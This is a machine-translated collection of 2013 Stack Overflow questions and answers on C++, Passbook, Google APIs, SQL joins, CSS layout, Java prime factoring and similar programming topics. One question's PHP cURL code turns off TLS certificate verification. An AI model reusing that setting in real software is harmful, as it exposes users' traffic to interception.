    A a;
    fn0(std::bind(&A::funcA, &a, _1)); // ok
    fn1(std::function<void(int)>(std::bind(&A::funcA, &a, _1))); // ok, but verbose
    fn1(std::bind(&A::funcA, &a, _1)); // concise, but won't compile
} 
```

可能不相关，但我在 Linux 上使用 gcc 4.7.2。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-15T23:15:23.823

最好给出`Callback`一个通用的构造函数：

```
struct Callback
{
    typedef std::function<void(int)> ftype;
    ftype fn_;

    template <typename T,
              typename = typename std::enable_if<std::is_constructible<ftype, T>::value>::type>
    Callback(T && f) : fn_(std::forward<T>(f))
    { }
}; 
```

（我添加了第二个默认模板参数，以仅对`T`语句有意义的类型启用此构造函数，以免创建错误的可转换性属性。）请注意，此技术如何从转换链中删除一个隐式用户定义转换，通过为调用*显式*构造函数`fn_`。

# ios - 建立存折通行证

> ID：14348684
> 
> 赞同：2
> 
> 时间：2013-01-15T23:13:40.593
> 
> 标签：ios, passbook

我一直在为我的一些应用程序集成 Passbook。现在，我在这方面使用了 Ray Wenderlich 的教程，坦率地说，即使构建一个 Pass 也很痛苦。我必须将图标文件全部准备好，对 JSON 文件进行编程，获取填充了所有 SHA1 值的清单文件，然后在终端中运行几行来对其进行签名，然后再运行另一行来压缩它。是否有任何在线服务或程序可用于将 pkpass 文件保存到计算机，然后我可以上传到我的服务器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T00:56:05.313

还有相当多的开发人员工具可以帮助您创建通行证，您可以在[wikipedia](http://en.wikipedia.org/wiki/Passbook_%28application%29#Developer_tools)上找到一个列表。

我们提供了一个 Objective-C SDK 和一个免费的云服务，让您可以创建模板并生成通行证。[您可以在github](https://github.com/passslot/passslot-ios-sdk)上找到 SDK （包括示例应用程序）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T00:39:48.497

有许多服务可用于生成通行证。在[维基百科](http://en.wikipedia.org/wiki/Passbook_%28application%29)上查看提供者、工具和项目的完整列表。

如果要更新通行证，则需要构建[Passbook Web 服务](https://developer.apple.com/library/ios/#documentation/PassKit/Reference/PassKit_WebService/WebService.html#//apple_ref/doc/uid/TP40011988)。更新通行证时，Web 服务会向设备发送一个新的 .pkpass 包。因此，您的 Web 服务还必须能够签署通行证，除非您想在发送推送请求之前手动创建它们并将其上传到您的服务器。

使用我们的服务[PassKit](https://create.passkit.com)，您可以使用 WSIYWIG 编辑器创建模板，然后通过简单的 API 调用直接在您的服务器上创建一个通行证。您还可以通过我们的 API 更新通行证并将更新推送到通行证。如果您只想获取 .pkpass 包，则可以将 /d 附加到 pass URL（以 r.pass.is 开头的那个），或`PassKit API`在您的用户代理字符串中使用。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-01-16T10:13:40.793

您还应该在此处查看 Apple 的 Passbook 支持材料： [https ://developer.apple.com/passbook/](https://developer.apple.com/passbook/)

他们有一个名为 SignPass 的简单 XCode 项目，您可以使用它轻松创建自己的通行证。

注意：您需要成为 Apple 开发者计划的成员才能访问这些材料..

这里有更多 Passbook 相关信息：http: [//www.flonsolutions.com](http://www.flonsolutions.com)

安德鲁

# api - 环球邮报金融 - 有没有东西可以提取类似的金融数据

> ID：14348687
> 
> 赞同：1
> 
> 时间：2013-01-15T23:14:10.380
> 
> 标签：api, finance

我正在查看全球和邮件金融网站，它几乎拥有人们想要的实时股票和财务报告，如果可能的话，还有共同基金信息。我想知道是否有人知道他们使用什么或类似的产品？我的预算有限，因为我想自己制作非常深入的股票/共同基金投资组合跟踪器。（因此这是我的个人 $）

通过查看其他较旧的 stackoverflow 问题：

*   -Mergent - 他们的 API 的免费试用不再有效，而且，您甚至需要通过销售人员才能看到它。

*   - 雅虎财经 - 没有财务报告（资产负债表、现金流等）

*   -Google 金融 - 已弃用

*   编辑：汤普森路透社 - 我联系了销售，他们从未回答。我用了他们的“给我们发电子邮件”，他们从来没有回复过。

有任何想法吗？

# google-api - Google API 返回访问未配置

> ID：14348689
> 
> 赞同：17
> 
> 时间：2013-01-15T23:14:26.730
> 
> 标签：google-api, http-status-code-403

我认为这将是直截了当的，但由于某种原因，我在这个问题上受到了打击。

我正在使用 PHP + CURL 来尝试检索 Web 字体列表。代码很简单：

```
 $url = "https://www.googleapis.com/webfonts/v1/webfonts?sort=popularity&key=MY_SERVER_APPS_KEY";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $google_response = curl_exec($ch);
        curl_close($ch); 
```

该代码正在访问 Google，但 $google_response 总是返回：

```
"error": {
    "code": 403,
    "errors": [
        {
            "domain": "usageLimits",
            "reason": "accessNotConfigured",
            "message": "Access Not Configured"
        }
    ],
    "message": "Access Not Configured"
} 
```

我已经设置了一个服务器访问密钥并将我的两个 Web 服务器的 API 密钥放在上面。（为了验证我的 IP，我在 curlmyip.com 上做了一个 WGET）我还从“服务”选项卡中启用了“Web Fonts Developer API”。

有什么我可以忽略的吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-01-17T06:32:17.373

我找到了解决方案。显然我需要注册我的服务器的 IPv6 地址，而不是 IPv4。添加它们后无需任何代码更改即可工作。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-01-20T21:23:36.757

在我的情况下**，所需的 API 未启用**。

启用：

1.  转到[https://console.developers.google.com](https://console.developers.google.com)
2.  点击左上角的菜单图标
3.  `API Manager`从菜单中单击
4.  在搜索栏中搜索您的 API（例如 YouTube Data API v3）并点击它
5.  进入该 API 的子页面后，单击`Enable`左上角的

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-04-30T05:53:16.590

删除所有“允许的 IP”，然后删除允许的任何 IP

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-03-29T04:23:18.280

我按顺序尝试了上面列出的解决方案，但未能得到结果。发生这种情况时，YouTube、Dialogflow 和 Google+ API 集成已经停用了几个月。

最终唯一的解决方案是：

*   创建一个新项目
*   创建一个新密钥
*   复制**应用程序限制下的 IPv4 和 IPv6 地址**
*   根据您的应用程序的需要更新**API 限制**

# python - Python pickle 模块文档，是不是有点误导？

> ID：14348697
> 
> 赞同：0
> 
> 时间：2013-01-15T23:14:57.430
> 
> 标签：python, pickle

python 文档说：pickle 可以透明地保存和恢复类实例，但是类定义必须是可导入的，并且与存储对象时存在于同一个模块中。
我可以在存储类的模块中放置一个pickler/unpickler吗？
还是我必须将课程放在模块中？如何？我正在尝试从外部模块中的类中腌制/取消腌制对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:46:40.333

你可以pickle任何python类实例，只要`pickle`模块可以在你加载pickle时再次导入它。

无论您在 python 代码中的哪个位置使用`load()`或`dump()`，只要稍后可以通过从同一位置导入它们来再次检索您要腌制的数据，这才重要。

所以，如果你有一个模块，里面`foo.bar`有一个类`Spam`，那么只要你能做，`from foo.bar import Spam`你就可以腌制那个类的实例，因为`pickle`以后可以从同一个模块再次加载那个类。

# jquery - jQuery Autocomplete 使用一件事匹配然后填写表单的其余部分

> ID：14348699
> 
> 赞同：0
> 
> 时间：2013-01-15T23:15:01.300
> 
> 标签：jquery, jquery-autocomplete

我一直在尝试使用 jquery 让自动完成功能正常工作。 [jsFiddle of example](http://jsfiddle.net/B92H3/3/)我的代码似乎验证得很好-知道为什么它不起作用吗？

```
 $("#producername").autocomplete({
  source: [{
    "label": "Acme Producer",
    "value": {
      "name": "Acme Producer",
      "address": "555 Spruce St\nNew City, NY  55555",
      "phonenumber": "215-555-5555",
      "key": "Test Key"
    }
  }],
  select: function (event, ui) {
    $("#producername").val(ui.item.name);
    $("#phonenumber").val(ui.item.phonenumber);
    $("#address").val(ui.item.address);
    $("#producerkey").val(ui.item.key);
  },
  minLength: 1
}); 
```

html:

```
<table align="center">
  <tr>
    <th>Name</th>
    <td colspan>
      <input type="text" name="producername" id="producername" class="name"
      value="" />
    </td>
    <th>Phone Number</th>
    <td>
      <input type="text" name="phonenumber" id="phonenumber" class="phone" value=""
      />
    </td>
  </tr>
  <tr>
    <th>Address</th>
    <td colspan="3">
      <textarea name="address" id="address" class="name" rows="5" style="width:90%"></textarea>
      <input type="hidden" name="producerkey" id="producerkey" value=""
      />
    </td>
  </tr>
</table> 
```

任何帮助将不胜感激！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:38:31.583

您没有在 JS fiddle（管理资源）中引用 jquery UI 库。看看这个，你非常接近。

value 属性自动设置为 autocomplete(able) 文本框的值

**[JSFIDDLE](http://jsfiddle.net/9jeQ9/1/)**

```
$("#producername").autocomplete({
  source: [{
    "label": "Acme Producer",
    "value": "Acme Producer",
    "data": {
      "name": "Acme Producer",
      "address": "555 Spruce St\nNew City, NY  55555",
      "phonenumber": "215-555-5555",
      "key": "Test Key"
    }
  }],
  select: function (event, ui) {
    console.log(ui.item)
    $("#producername").val(ui.item.data.name);
    $("#phonenumber").val(ui.item.data.phonenumber);
    $("#address").val(ui.item.data.address);
    $("#producerkey").val(ui.item.data.key);
  },
  minLength: 1
}); 
```

# javascript - 一个元素可以在 DOM 中但未加载吗？

> ID：14348702
> 
> 赞同：2
> 
> 时间：2013-01-15T23:15:12.250
> 
> 标签：javascript, html, dom

我想在 DOM 元素完全加载时添加一个事件。唯一的困难是当我的脚本运行时该元素还不存在。

我的解决方法是定期测试元素是否在脚本中

```
window.setInterval(function(){
    if (document.getElementById("myId"))
        /* do stuff */ ...; 
}, 100); 
```

现在又来了一个问题，第一次找到元素时，我保证它是满载的吗？

*   如果是，那就完美了。
*   如果没有，我该如何测试它？（当它还没有加载时，我可以将它附加到`onload`事件中没有任何问题）

我没有 jQuery。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:17:17.427

> 我第一次找到元素时，我能保证它是满载的吗？

**是**的，除非元素是 an`<img>`或 an`<iframe>`我相信它不是，所以它是*"完美的"*。

另一个重要的注意事项是：

您可以将事件附加到一个元素，尽管它没有完全加载，它在 DOM 中的事实足以完成该任务。

顺便说一句，这是 jQuery 就绪事件与 javascript onload 事件之间的区别。

# grails - grails database-migration - 它可以生成'not null with default'吗？

> ID：14348705
> 
> 赞同：1
> 
> 时间：2013-01-15T23:15:23.873
> 
> 标签：grails, database-migration

在我看来，数据库更改的一个常见要求是添加一个不能为空的列。解决在某些情况下填充此列的问题的一种方法是在 DDL 中将其定义为“not null with default”。

Grails 似乎不直接在约束中支持“NNWD”。我测试了一个似乎可以等效的想法：

```
 String name = default
    ...
    name nullable:false 
```

我想知道*dbm-gorm-diff changleog-n.xml*是否能够将其检测为具有默认值的空值。但它没有。那是版本 1.2.2。我看到 Liquibase 通过它的`<addNotNullConstraint`.

是否有计划引入这种支持？关于我如何解决这个问题的任何建议，可能是通过使用 dbm 脚本的用户编写的脚本。

问题：

我尝试使用 1.3.2，但在运行脚本时出现 MissingMethodException。实际的错误行是：

groovy.lang.MissingMethodException：没有方法签名：静态 grails.plugin.databasemigration.ScriptUtils.executeAndWrite() 适用于参数类型：(java.lang.String, java.lang.Boolean, DbmGormDiff$_run_closure1_closure2) 值：[changelog -with-data.xml，假，DbmGormDiff$_run_closure1_closure2@2f673724]

我不明白，因为 args 似乎与插件代码中的 executeAndWrite() 方法的签名相匹配。

问候，约翰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T09:58:50.857

我已经对这个主题进行了一些调查，并意识到解决方案更复杂，并且尝试通过使用“not null with default”添加列来解决问题并不是要走的路。由于我计划使用 Liquibase 和 Ant 来更新测试、uat 和实时环境中的数据库，所以我在下面提到使用 xml 文件。

如果表没有任何数据，那么您可以添加一个“非空”列。在我看来，这对于实时数据库来说是不太可能的情况。

当表包含数据时，必须将新列定义为空。有 3 个步骤，需要手动更新插件生成的 xml 文件：

*   将新域属性定义为“nullable:true”，并生成 diff xml 文件。
*   使用 <SQL> 标记更新 xml 文件以添加新的变更集：

    <sql>update [table] set [column]='dflt value' where [column] 为空</sql>

*   现在您可以将新列定义为非空。可以使用更多原始 sql，或者查找 Liquibase 的 <addNotNullConstraint>。

我不认为该列确实需要默认值，因为 Grails 将确保空值不会从浏览器中通过。我这么说是因为我还没有找到改变添加列的定义的方法，因此它具有默认值。

约翰

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-01T02:20:03.980

如果您使用的是 1.4.0 版本的插件，它不会为默认值生成更改日志 xml，但您可以编辑生成的文件以添加`defaultValue`&`value`属性，它将通过更新现有的添加非空列而不会出错带有`value`属性的记录。

这是一个小例子，说明修改后的样子：

```
 <changeSet author="anybody (generated)" id="1467324956xxx-xx">
    <addColumn tableName="table1">
    <column name="col1" type="varchar(10)" defaultValue="value1" value="value1">
    <constraints nullable="false"/>
    </column>
    </addColumn>
    </changeSet> 
```

您可以在 liquibase 文档[http://www.liquibase.org/documentation/column.html](http://www.liquibase.org/documentation/column.html) [http://www.liquibase.org/documentation/changes/add_column.html上找到更多信息](http://www.liquibase.org/documentation/changes/add_column.html)

# php - SQL左外连接选择不匹配的记录？

> ID：14348706
> 
> 赞同：1
> 
> 时间：2013-01-15T23:15:28.567
> 
> 标签：php, mysql, sql

```
question table
========================
question_id
1
2
3
4

user_answer table
========================
user_id  question_id
33       2
44       4
33       1
44       3 
```

此代码将返回问题 ID（2 和 1）我想要的是从表问题中检索另一个问题 ID，所以我希望结果为（3 和 4）

```
 $fadi = mysql_query("SELECT * FROM question
         LEFT OUTER JOIN user_answer
           ON user_answer.question_id = question.question_id
              WHERE user_answer.user_id = 33");

   Print "<table border cellpadding=3>";
   while($info = mysql_fetch_array($fadi))
   { Print "<tr>"; 
    Print "<th>question </th> <td>".$info['question_id'] . "</td></tr>";
   }  Print "</table>"; } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:23:10.220

我相信您正在寻找的是 IS NULL 字样：

```
$fadi = mysql_query("SELECT * FROM question
     LEFT OUTER JOIN user_answer
       ON user_answer.question_id = question.question_id
          AND user_answer.user_id = 33
       WHERE user_answer.question_id IS NULL"); 
```

您可以更进一步，仅从问题表中检索问题 ID：

```
$fadi = mysql_query("SELECT question.question_id FROM question
     LEFT OUTER JOIN user_answer
       ON user_answer.question_id = question.question_id
          AND user_answer.user_id = 33
       WHERE user_answer.question_id IS NULL"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:31:14.317

编辑：改进版。

```
 $fadi = mysql_query("SELECT * FROM question WHERE  question.question_id NOT IN (SELECT user_answer.question_id FROM user_answer WHERE user_answer.user_id = 33)");

   Print "<table border cellpadding=3>";
   while($info = mysql_fetch_array($fadi))
   { Print "<tr>"; 
    Print "<th>question </th> <td>".$info['question_id'] . "</td></tr>";
   }  Print "</table>"; } 
```

MySQLi 版本：

```
 $link = mysqli_connect($hostname, $username, $password, $database);
  if (!$link){ 
  echo('Unable to connect to database');
  }
  else{
  $fadi = mysqli_query("SELECT * FROM question WHERE  question.question_id NOT IN (SELECT user_answer.question_id FROM user_answer WHERE user_answer.user_id = 33)", $link);

   Print "<table border cellpadding=3>";
   while($info = mysqli_fetch_array($fadi,MYSQL_BOTH))
   { Print "<tr>"; 
    Print "<th>question </th> <td>".$info['question_id'] . "</td></tr>";
   }  Print "</table>"; }

  }
  mysqli_close($link); 
```

实际操作：[http ://www.sqlfiddle.com/#!2/27b6f/21](http://www.sqlfiddle.com/#!2/27b6f/21)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:46:55.407

可能的答案是`mysql_query`从`mysql_fetch_array`检索“question_id”值中获取您使用的相同值，最后，如果您有问题的计数（如果没有，您可以使用 mysql 计数），使用 php 函数`array_diff()`检索（从增量排序的 question_id 整数值数组或来自“问题”表的 question_id 值数组）正是您想要的

# css - 无法在 IE 中将网页居中

> ID：14348707
> 
> 赞同：1
> 
> 时间：2013-01-15T23:15:29.893
> 
> 标签：css

[我的网站](http://spectrasoft.com)在 IE 8 和 9 中是左对齐的，而它应该像在 Chrome 和 Firefox 中一样居中。我已经尝试过像下面这样的标准解决方案，但没有运气。页面上有多个样式表——也许有冲突？任何帮助，将不胜感激...

```
*{  
    margin:0;  
    padding:0;  
}  

body{  
    text-align:center; /*For IE6 Shenanigans*/  
}  

#wrapper{  
    width:960px;  
    margin:0 auto;  
    text-align:left;  
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:58:42.560

尽管您在 style.css 样式表中定义了以下 CSS-

```
#wrapper{
width:960px;
margin:0 auto;
text-align:left;
position:relative;
} 
```

页面上没有对应的 ID 为 wrapper 的元素，您的#header、#nav、匿名内容和#footer div 都是文档正文的直接子元素。

作为具有 ID“logo”的 h1 的孩子的链接几乎肯定需要在现有的“top”值之外添加一个左值（可能为零），因为它与您的电话号码重叠。

您似乎还将作为 IE8 中 body 的第一个子项添加的条件注释编码为 -

```
<!--[if lt IE 8]--> <!--[endif]--> 
```

出现在页面中。

您是否尝试过使用[Chrome 开发者工具](https://developers.google.com/chrome-developer-tools/docs/overview)或[Firebug（用于 Firefox）](http://getfirebug.com/)来检查您的代码？

# java - 欧拉计划 3 号

> ID：14348709
> 
> 赞同：-3
> 
> 时间：2013-01-15T23:15:39.910
> 
> 标签：java

首先，这不是家庭作业……在课外从事这个工作以练习 Java。

```
public class Problem3 {
public static void main(String[] args) {    
    int n = 13195;

    // For every value 2 -> n
    for (int i=2; i < n; i++) {
        // If i is a multiple of n
        if (n % i == 0) {
            // For every value i -> n
            for (int j=2; j < i; j++) {
                if (n % j != 0) {
                    System.out.println(i); 
                    break;
                }
            }
        }
    }
  }
} 
```

我一直在修改代码，试图让它做我想做的事。

正如问题所说，你应该得到 5、7、13 和 29。

我得到了这些值，再加上 35、65、91、145、203、377、455、1015、1885 和 2639。我认为我走在正确的轨道上，因为我有所有正确的数字......只有几个额外的。

在检查一些既能被 n 整除又是素数的数字时，这里的问题是额外的数字不是素数。不知道发生了什么。

如果有人有任何见解，请分享。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:19:56.267

这部分

```
for (int j=2; j < i; j++) {
    if (n % j != 0) {
        System.out.println(i); 
        break;
    } 
```

不检查是否`i`是素数。除非`i`很小，否则总会`i`在某个时候打印出来，因为有比`i`这小的数字不会除`n`。所以基本上，这将打印出所有除数（例如，`n`它不会打印除数，但这是一个例外）。`4``n == 12`

另请注意，算法 - 使用`long`而不是`int`避免溢出 - 即使固定检查除数是否`i`是决定是否打印它的素数，也需要很长时间才能运行实际目标。您应该进行调查以找到更好的算法（提示：您可能想要找到完整的素数分解）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-02T02:16:34.667

我用 Java 解决了这个问题并查看了我的解决方案，明显的建议是开始使用 BigInteger，查看 java.math.BigInteger 的文档

还有很多这些问题是“数学”问题，就像它们是“计算机科学”问题一样，所以更多地研究数学，确保你在提出算法之前合理地理解数学。蛮力有时会奏效，但通常有一些技巧可以解决这些问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-30T08:24:03.333

你在课外解决这些问题真是太好了。看到你的代码。您正在主函数/线程内编写程序代码。而是先编写函数并从算法上逐步思考。解决这个问题的简单算法可以是这样的：

*   1) 从最小质数 2 到 13195/2 连续生成数字。（任何数字的因数总是小于其值的一半）
*   2) 检查生成的数是否为素数。
*   3）如果数字是素数，则检查它是否是13195的因数；
*   4) 返回最后一个素数，因为它将是 13195 的最大素数；

另一个建议是尝试编写单独的函数以避免代码复杂性。代码是这样的...

```
 public class LargestPrimeFactor {

public static long getLargestPrimeFactor(long num){

   long largestprimefactor = 0;

   for(long i = 2; i<=num/2;i++){

       if(isPrime(i)){

           if(num%i==0){

               largestprimefactor = i;

               System.out.println(largestprimefactor);

           }            
       }              
   }

   return largestprimefactor;

}

public static boolean isPrime(long num){

    boolean prime=false;
    int count=0;
    for(long i=1;i<=num/2;i++){

        if(num%i==0){

            count++;

        }
        if(count==1){

            prime = true;

        }
        else{

            prime = false;
        }           
    }

    return prime;

}

public static void main(String[] args) {

    System.out.println("Largest prime factor of 13195 is "+getLargestPrimeFactor(13195));

} 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-21T06:27:00.140

不了解Java，但如果有帮助，这是我的C代码。

```
# include <stdio.h>
# include <math.h>

// A function to print all prime factors of a given number n
void primeFactors(long long int n)
{
// Print the number of 2s that divide n
while (n%2 == 0)
{
printf("%d ", 2);
n = n/2;
}
int i;
// n must be odd at this point. So we can skip one element (Note i = i +2)
for ( i = 3; i <= sqrt(n); i = i+2)
{
// While i divides n, print i and divide n
while (n%i == 0)
{
printf("%d ", i);
n = n/i;
}
}

// This condition is to handle the case whien n is a prime number
// greater than 2
if (n > 2)
printf ("%ld ", n);
}

/* Driver program to test above function */
int main()
{
long long int n = 600851475143;
primeFactors(n);
return 0;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-31T22:11:38.810

蛮力也可以用来检查这个问题的因素是否是素数……例如。

```
 for(i=1;i<=n;i++)// n is a factor.
      {
        for(j=i;j>=1;j--)
          {
             if(i%j==0)
              { 
                  counter++;// set counter=0 befor.
              }
             if(counter==2) // for a prime factor the counter will always be exactly two.
             {
                  System.out.println(i);
              }
              counter=0;   
          }
      } 
```

# java - 在 Eclipse 中对 LWJGL 进行排序

> ID：14348710
> 
> 赞同：0
> 
> 时间：2013-01-15T23:15:43.360
> 
> 标签：java, eclipse, lwjgl, slick2d

我在使用 LWJGL 时遇到问题，我似乎无法找到可行的解决方案。我正在为我的大学项目开发​​游戏，当我运行“SimpleGame”代码时，我不断收到此错误：“线程“主”java.lang.UnsatisfiedLinkError 中的异常：java.library.path 中没有 lwjgl”

几周来我一直在寻找解决方案，但它似乎不想工作。我已将 jar 文件复制到项目中的“lib”文件夹中，并为包含必要 DLL 的原生文件夹创建了一个文件夹，并将所有内容都放在了构建路径中，并尝试了 VM 参数的多种组合。

我对此束手无策。任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T12:59:11.933

我解决了。我将“lwjgl”文件夹（包含文档、jar、natives 文件夹等）复制到我的项目中名为“lib”的文件夹中。我希望这对未来的其他人有所帮助，因为我多年来一直试图找到一个可行的解决方案。

我编辑了我的 VM 参数，使它们看起来像这样（无法发布屏幕截图，因为我还没有足够的代表）：

-Djava.library.path="lib\lwjgl"

-Djava.library.path="lib\lwjgl\jar"

-Djava.library.path="lib\lwjgl\native"

-Djava.library.path="lib\lwjgl\native\windows"

我还确保将“lwjgl.jar”和“slick.jar”添加到我的构建路径中。再次，我希望这会有所帮助！非常感谢 @Crynix 建议我检查我的 VM 参数。

# magento - 在 Magento 中翻译运输方式标题

> ID：14348712
> 
> 赞同：1
> 
> 时间：2013-01-15T23:15:59.813
> 
> 标签：magento, magento-1.7

我按照以下两个教程创建了一个自定义运输模块

[http://techportal.inviqa.com/2011/06/09/creating-a-custom-magento-shipping-method/](http://techportal.inviqa.com/2011/06/09/creating-a-custom-magento-shipping-method/)

[http://www.magentocommerce.com/wiki/5__-_modules_and_development/shipping/create-shipping-method-module](http://www.magentocommerce.com/wiki/5_-_modules_and_development/shipping/create-shipping-method-module)

我现在需要翻译运输方式标题，但是，我收到以下错误

```
Invalid method VMR_Shipping_Model_Carrier_Customrate::__(Array
    (
        [0] => Flat Rate: 3-10 Days
    )
) 
```

使用这行代码

```
$optionTitle = $this->__('Flat Rate: 3-10 Days'); 
```

非常感谢任何想法或输入！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:53:08.580

这是因为`__()`函数定义在核心块、核心控制器和核心助手的抽象类中，而不是核心模型中。您可以通过设置扩展`Mage_Core_Helper_Abstract`和运行该功能的助手轻松翻译您想要的任何内容。

`echo Mage::helper('vrm_shipping')->__('Flat Rate: 3-10 Days')`

...或者，如果您感到懒惰，请让抽象助手为您翻译

`echo Mage::helper('core')->__('Flat Rate: 3-10 Days')`

...但是，我不确定您在做什么的细节，但通常最好在块或模板本身内进行翻译。为什么不调用`__()`模板中输出运输方式的函数呢？

# html - 棘手的垂直对齐中心与css

> ID：14348714
> 
> 赞同：0
> 
> 时间：2013-01-15T23:16:05.150
> 
> 标签：html, css, center, vertical-alignment, fixed-width

我发现了关于如何使用 css 垂直对齐内容的不同建议。但是，这些都无法处理我想要的。这是我想要的：

一般来说，我有一些文本应该填充一些空间的左半部分，而图片应该在空间的右半部分。

如果文本的高度小于图片，则文本和图片都应在空间顶部垂直对齐：

```
TextTextText   PicturePicture
TextTextText   PicturePicture
               PicturePicture 
```

如果文字的高度大于图片的高度，则文字应垂直对齐顶部，图片相对于文字居中。

```
TextTextText
TextTextText   PicturePicture
TextTextText   PicturePicture
TextTextText   PicturePicture
TextTextText 
```

这是我尝试的一种直接方式（没有图片的文本版本）：

```
<div style="width: 100%">
  <div style="width: 50%; display: inline-block; vertical-align: top;">
    TextTextText <br>
    TextTextText <br>
    TextTextText
  </div><div style="width: 50%; display: inline-block; vertical-align: middle;">
    PicturePicture <br>
    PicturePicture
  </div>
</div> 
```

然而，并没有达到我想要的效果。右边的内部 div（图片）只是在顶部而不是相对于文本的中间对齐。`vertical-align: middle`设置和设置没有区别`vertical-align: top`。然而，有趣的是，设置`vertical-align: bottom`会有所不同。

外部 div 包含在某个宽度的其他元素中。但是，我不能用任何固定的度量来指定这个宽度，例如 px。相同宽度的两个内部 div 相同。

使内部 divs 表格单元格达到正确的垂直效果。但是，我不能使用`display: table-cell`，因为我需要确保左侧内部 div 保持其宽度，即使右侧内部 div 可能具有向右溢出的内容，例如`PicturePicturePicturePicturePicture...`. 这会导致左侧单元格的宽度缩小，这是我不想要的。

此外，我不知道内容的高度，因此使用固定高度的垂直对齐技巧都不起作用。

这似乎不是一个太罕见的任务，但我无法找到任何解决方案。是否有可能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:07:50.803

如果您不希望左列缩小，请添加 a `min-width`。

[http://jsfiddle.net/pUbWt/1/](http://jsfiddle.net/pUbWt/1/)

```
.container {
  display: table;
  width: 100%;
}

.container .caption, .container .picture {
  display: table-cell;
}

.container .caption {
  vertical-align: top;
  min-width: 10em;
}

.container .picture {
  vertical-align: middle;
} 
```

Flexbox 也可以，但在生产站点中开始使用还为时过早。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T00:10:40.673

垂直对齐总是很棘手，因为 CSS 并不是为了实现这一点而设计的。
不过，这就是你所追求的吗？[http://jsfiddle.net/N7px2/](http://jsfiddle.net/N7px2/)

*如果是这样，请继续阅读。*
首先，我删除了您的内联样式，因为这是不好的做法。只需`<style>...</style>`在 HTML 的头部使用，甚至更好：使用外部 CSS 文件。

然后，我浮动你的 div`#b`并`#c`像你的例子一样对齐它们。请参阅`background-color`和`border`快速了解每个元素的放置位置。
因为浮动让父元素崩溃，所以我使用了 clearfix 来解决这个问题。[在此处](http://nicolasgallagher.com/micro-clearfix-hack/)阅读更多相关信息。

现在垂直对齐：我将图像定位在`#c`absolute 并给它一个 margin `top: 50%`。显然，这将图像推得太多了，但这就是它的工作原理。之后，我应用了负片`margin-top: -25%`将图像拉回原位。请注意，这只适用于父元素是相对定位的。浏览器对负边距的支持非常好，只要它们不用于修复错误的布局，就可以使用它们。

另一个注意事项：因为`position: absolute`从流程中取出一个元素，所以会`#c`崩溃。如果你想给出`#c`一个`background-image`或类似的东西，你需要更多的标记来解决这个问题——只需添加另一个 div。

希望对您有所帮助！

编辑：对不起，我刚刚意识到这段代码与我相信的不完全一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T09:18:32.347

我不清楚当图片对于右侧内部 div 来说太宽时你想要什么行为，除了它不应该影响左侧内部 div 的宽度，但这符合你的要求吗？

HTML。

```
<div class="container">
  <div class="caption cell">
    Text Text Text <br/>
    Text Text Text <br/>
    Text Text Text <br/>
    Text Text Text <br/>
    Text Text Text <br/>
    Text Text Text
  </div>

  <div class="picture cell">
    <div>
      <img src="http://placehold.it/500x50" />
    </div>
  </div>
</div> 
```

CSS

```
.container {display:table; table-layout: fixed; width:100%; }
.cell { display: table-cell; width:50%; }
.caption { vertical-align: top; }
.picture { vertical-align: middle; }
.picture div { overflow-x:hidden; } 
```

JSFiddle 在[http://jsfiddle.net/92wcy/1/](http://jsfiddle.net/92wcy/1/)

# jquery - jQuery - 图像预加载的事件处理

> ID：14348718
> 
> 赞同：0
> 
> 时间：2013-01-15T23:16:20.017
> 
> 标签：jquery, image, canvas, preloading

处理一个 HTML5/CSS3 项目，该项目需要加载一些稍大（约 100k）的精灵贴图并将其放置到`<canvas>`. 放置没有问题，但我遇到了在加载图像之前意外放置图像的问题，因为无法检测通过 javascript 请求的图像的加载完成。

预加载图像并处理 oncomplete 事件的最佳方法是什么？现在我正在使用标准检测页面加载`$(document).ready()`，但我可以使代码适应任何所需的事件处理程序。如果有一个插件可以处理这一切，那就太棒了。

不过，我对预加载有点特别——如果可能的话，我希望一切都留在 javascript 中。寻找比将图像放置在隐藏的 div 或虚拟 css 中更优雅的东西。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:18:25.350

```
var img = new Image();
img.onload = callbackFunction;
img.src = 'http://source.of/image.png'; 
```

如果您经常使用它，只需为其创建一个函数：

```
function preloadImage (src, callback) {
    var img = new Image();
    img.onload = callback;
    img.src = src;
    return img;
} 
```

* * *

如果要在*所有*图像加载完毕后触发回调，请使用[延迟](http://api.jquery.com/category/deferred-object/)对象：

```
